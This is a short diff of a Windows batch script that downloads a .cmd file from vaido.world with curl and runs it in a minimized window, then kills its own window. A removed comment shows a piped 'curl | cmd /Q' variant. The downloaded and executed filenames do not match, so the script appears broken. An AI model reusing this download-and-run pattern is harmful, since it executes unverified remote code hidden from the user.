@@ -24,15 +24,10 @@ read varname
 
 
 title download_script_execution_with_cmd_q_option
-REM del "execute.cmd"
 curl "http://vaido.world/download-ubuntu/?randomqueryrequest" > "vaido-world.cmd"
-REM https://stackoverflow.com/questions/19912941/convert-all-cr-to-crlf-in-text-file-using-cmd
-REM TYPE execute.cmd | FIND "" /V >executeyes.cmd
-REM del "execute.cmd"
 SET "randomNum=%RANDOM%"
 cd "%~DP0"
 start /MIN "%randomNum%" cmd.exe /C ""vaido.world.cmd" "%randomNum%" "ARGUMENT_2""
-REM curl "http://vaido.world/download-ubuntu/" | cmd /Q
 cls
 taskkill /fi "WINDOWTITLE eq download_script_execution_with_cmd_q_option*"
 
